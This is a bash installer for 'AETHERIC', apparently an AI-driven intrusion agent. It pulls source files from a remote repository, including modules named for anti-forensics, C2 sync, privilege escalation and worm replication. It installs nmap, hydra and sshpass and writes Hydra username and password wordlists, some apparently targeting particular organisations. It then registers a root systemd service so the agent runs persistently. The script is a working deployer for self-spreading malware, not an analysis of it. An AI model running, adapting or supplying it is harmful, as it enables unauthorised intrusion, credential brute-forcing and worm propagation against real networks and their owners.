#!/bin/bash
# AETHERIC Installation Script (source-based, no binary)
set -e

REPO_URL="https://raw.githubusercontent.com/reconagent/version_1/main"
WORKDIR="/tmp/aetheric_install"
DESTDIR="/usr/local/aetheric"

# ------------------------------------------------------------------
# 1. Prepare working directory
# ------------------------------------------------------------------
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# ------------------------------------------------------------------
# 2. Install system dependencies
# ------------------------------------------------------------------
apt-get update -y
apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync

# ------------------------------------------------------------------
# 3. Download all source files (explicit list – NO wildcards!)
# ------------------------------------------------------------------
for file in \
    main.py config.py \
    core/daemonizer.py core/orchestrator.py core/anti_forensics.py core/c2_sync.py core/llm_brain.py \
    modules/network_recon.py modules/file_crawler.py modules/privesc_engine.py modules/attack_planner.py modules/worm_replicator.py modules/process_scraper.py \
    utils/net_utils.py utils/crypto_utils.py utils/logging_utils.py \
    requirements.txt; do
    mkdir -p "$(dirname "$file")"
    curl -s -o "$file" "$REPO_URL/$file"
done

# Ensure __init__.py exists (package markers)
touch core/__init__.py modules/__init__.py utils/__init__.py

# ------------------------------------------------------------------
# 4. Create wordlists for Hydra
# ------------------------------------------------------------------
cat > usernames.txt <<'EOF'
root
admin
user
kmit
ubuntu
tele
ngit
kmec
EOF

cat > passwords.txt <<'EOF'
kmit
root
kmit123
Kmit123$
Kmit@123$
tele123$
tele@123$
kmit@123
Kmit123
Tele123
Tele@123
KMIT123
kmit@123$
root123
root@123
admin
admin123
password
123456
12345678
1234
111111
Qbttxpse!541$$
tele123$
Kmit@123$
Kmit123$
ngit123
ngit@123
Ngit321$
EOF

# ------------------------------------------------------------------
# 5. Copy everything to permanent location
# ------------------------------------------------------------------
rm -rf "$DESTDIR"
mkdir -p "$DESTDIR"
cp -r . "$DESTDIR/"
cd "$DESTDIR"

# ------------------------------------------------------------------
# 6. Create virtual environment and install Python deps
# ------------------------------------------------------------------
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

# ------------------------------------------------------------------
# 7. Create systemd service (runs Python script directly)
# ------------------------------------------------------------------
cat > /etc/systemd/system/aetheric.service <<EOF
[Unit]
Description=Aetheric Daemon
After=network.target

[Service]
Type=simple
WorkingDirectory=$DESTDIR
Environment="HYDRA_USERLIST=$DESTDIR/usernames.txt"
Environment="HYDRA_PASSLIST=$DESTDIR/passwords.txt"
ExecStart=$DESTDIR/venv/bin/python $DESTDIR/main.py --resume
Restart=on-failure
RestartSec=10
User=root
MemoryMax=4G
CPUQuota=300%
TimeoutStopSec=300

[Install]
WantedBy=multi-user.target
EOF

# ------------------------------------------------------------------
# 8. Enable and start the service
# ------------------------------------------------------------------
systemctl daemon-reload
systemctl enable aetheric
systemctl start aetheric

# ------------------------------------------------------------------
# 9. Cleanup temporary directory
# ------------------------------------------------------------------
cd /
rm -rf "$WORKDIR"

echo "AETHERIC installed and running from source."
echo "Check status: systemctl status aetheric"
echo "View logs: journalctl -u aetheric -f"